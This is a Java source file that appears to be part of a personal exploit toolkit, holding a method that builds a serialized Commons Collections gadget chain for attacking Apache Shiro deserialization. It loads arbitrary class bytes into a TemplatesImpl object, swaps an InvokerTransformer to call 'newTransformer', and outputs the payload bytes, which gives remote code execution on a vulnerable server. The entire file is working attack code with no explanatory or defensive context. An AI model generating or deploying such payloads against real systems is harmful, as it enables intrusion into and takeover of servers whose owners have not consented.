package com.t4rrega.Shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.t4rrega.ser.SerTools;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class CCShiro_3a6 {

    public static byte[] CCShiro(byte[] classBytes) throws Exception{
//        byte[] bytes = Files.readAllBytes(Paths.get("/Users/t4rrega/JavaProjects/javaDemo/target/classes/test.class"));

        TemplatesImpl obj = new TemplatesImpl();
        SerTools.setFieldValue(obj, "_bytecodes", new byte[][] {classBytes});
        SerTools.setFieldValue(obj, "_name", "ShiroAttack");
        SerTools.setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer("getClass", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, obj);

        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");

        outerMap.clear();
        SerTools.setFieldValue(invokerTransformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(expMap);
        objectOutputStream.close();

        return byteArrayOutputStream.toByteArray();
    }
}
